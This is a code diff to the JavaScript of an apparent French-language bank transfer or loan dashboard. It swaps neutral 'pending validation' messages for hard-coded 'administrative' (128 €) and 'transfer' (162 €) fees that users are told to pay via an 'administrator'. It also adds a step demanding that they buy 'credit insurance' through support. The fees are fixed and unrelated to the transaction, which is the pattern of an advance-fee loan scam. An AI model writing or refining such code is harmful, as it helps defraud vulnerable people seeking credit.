@@ -1850,8 +1850,12 @@ document.addEventListener('DOMContentLoaded', function () {
             const amount = Number(transferData.amount) || parseFloat(document.getElementById('transferAmount').value) || 0;
             const tracking = document.getElementById('dashTracking')?.textContent || '—';
 
+            const fraisAdmin = 128.00;
+            const fraisVirement = 162.00;
+            const totalFrais = fraisAdmin + fraisVirement;
+
             messageDiv.innerHTML = `
-                <h3 style="color:#0f2b4b; margin-bottom:0.5rem;">Récapitulatif de l'opération</h3>
+                <h3 style="color:#0f2b4b; margin-bottom:0.5rem;">Relevé de l'opération</h3>
                 <div style="background:#f7faff; padding:1rem; border-radius:12px; text-align:left; font-size:0.95rem;">
                     <p><strong>Numéro de suivi :</strong> ${tracking}</p>
                     <p><strong>Nom et prénom :</strong> ${fullName}</p>
@@ -1859,8 +1863,12 @@ document.addEventListener('DOMContentLoaded', function () {
                     <p><strong>Banque :</strong> ${bankName}</p>
                     <p><strong>Montant demandé :</strong> ${amount.toFixed(2)} €</p>
                     <hr style="border:1px dashed #dce3ed; margin:0.7rem 0;">
-                    <p style="font-weight:600; color:#0f2b4b;">Statut de l'opération</p>
-                    <p>Votre demande a bien été enregistrée. Elle reste en attente de validation administrative avant le passage à l'étape suivante.</p>
+                    <p><strong>Frais administratifs :</strong> ${fraisAdmin.toFixed(2)} €</p>
+                    <p><strong>Frais de virement :</strong> ${fraisVirement.toFixed(2)} €</p>
+                    <p><strong>Total des frais :</strong> ${totalFrais.toFixed(2)} €</p>
+                    <hr style="border:1px dashed #dce3ed; margin:0.7rem 0;">
+                    <p style="font-weight:600; color:#0f2b4b;">Cher client,</p>
+                    <p>Veuillez contacter votre administrateur pour vous acquitter des frais de transfert afin de faire évoluer votre opération bancaire.</p>
                 </div>
             `;
 
@@ -1942,14 +1950,14 @@ document.addEventListener('DOMContentLoaded', function () {
             return;
         }
 
-        // --- ÉTAPE 3 : traitement administratif ---
+        // --- ÉTAPE 3 : assurance crédit ---
         if (step === 2) {
-            stepDisplay.textContent = 'Étape 3/3 – Traitement administratif';
+            stepDisplay.textContent = 'Étape 3/3 – Assurance crédit';
 
             messageDiv.innerHTML = `
                 <p><strong>Cher client,</strong></p>
-                <p>Votre demande de transfert a été validée pour traitement administratif.</p>
-                <p>Vous pouvez suivre l'évolution de l'opération depuis votre espace client. Toute information complémentaire nécessaire au traitement vous sera communiquée par le service administratif.</p>
+                <p>En raison de votre statut de nouveau demandeur de crédit, vous devez souscrire à une assurance crédit pour le présent financement afin de garantir la solvabilité des échéances à bonne date.</p>
+                <p>Veuillez contacter le support pour obtenir votre contrat d'assurance.</p>
                 <p style="margin-top:1rem;"><strong>Cordialement,</strong><br>Le Service Administratif</p>
             `;
 
